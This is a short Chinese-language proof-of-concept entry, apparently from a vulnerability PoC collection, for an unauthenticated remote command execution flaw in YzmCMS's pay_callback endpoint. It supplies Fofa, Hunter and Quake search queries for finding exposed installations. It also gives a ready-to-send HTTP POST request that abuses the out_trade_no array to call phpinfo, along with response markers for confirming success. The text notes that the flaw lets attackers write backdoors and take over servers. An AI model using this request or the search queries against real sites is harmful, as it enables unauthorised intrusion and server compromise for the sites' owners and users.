﻿# YzmCMS pay_callback 任意命令执行

> 更新时间：2024-05-06

> 漏洞编号：

> 漏洞说明：   YzmCMS是一款基于YZMPHP开发的一套轻量级开源内容管理系统,YzmCMS简洁、安全、开源、免费,可运行在Linux、Windows、MacOSX、Solaris等各种平台上,专注为公司企业、个人站长快速建站提供解决方案。

    YzmCMS /pay/index/pay_callback.html接口存在远程命令执行漏洞，未经身份验证的远程攻击者可利用此漏洞执行任意系统指令，写入后门文件，最终可获取服务器权限。

> 漏洞特征：Fofa:app="yzmcms"或Hunter:app.name="YzmCMS"或Quake：app:"yzmcms"

> 验证脚本：HTTP

```
POST /pay/index/pay_callback.html HTTP/1.1
Accept-Encoding: gzip
Content-Type: application/x-www-form-urlencoded
 
out_trade_no[0]=eq&out_trade_no[1]=1&out_trade_no[2]=phpinfo
```

> 响应代码特征：200

> 响应内容特征：php.ini

> 上传文件定位：

> 验证文件来源：YzmCMS pay_callback 任意命令执行.poc

